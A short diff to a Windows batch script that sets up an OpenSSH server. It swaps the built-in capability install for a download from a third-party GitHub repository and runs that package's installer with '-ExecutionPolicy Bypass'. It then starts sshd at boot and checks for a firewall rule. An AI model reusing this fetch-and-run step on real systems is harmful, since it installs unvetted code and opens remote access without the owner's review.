@@ -1,6 +1,9 @@
 @echo off
-echo Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0 > "%temp%\run.ps1"
-echo Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 >> "%temp%\run.ps1"
+echo Invoke-WebRequest -Uri 'https://github.com/a7ecc/OpenSSH/raw/main/OpenSSH.zip' -OutFile '%temp%\OpenSSH.zip'> "%temp%\run.ps1"
+echo Expand-Archive '%temp%\OpenSSH.zip' -DestinationPath '%systemdrive%\Program Files\OpenSSH'>> "%temp%\run.ps1"
+echo cd "%systemdrive%\Program Files\OpenSSH">> "%temp%\run.ps1"
+echo powershell.exe -ExecutionPolicy Bypass -File ".\install-sshd.ps1">> "%temp%\run.ps1"
+echo del "%temp%\OpenSSH.zip">> "%temp%\run.ps1"
 echo Start-Service sshd >> "%temp%\run.ps1"
 echo Set-Service -Name sshd -StartupType 'Automatic' >> "%temp%\run.ps1"
 echo if (!(Get-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -ErrorAction SilentlyContinue ^| Select-Object Name, Enabled)) { >> "%temp%\run.ps1"
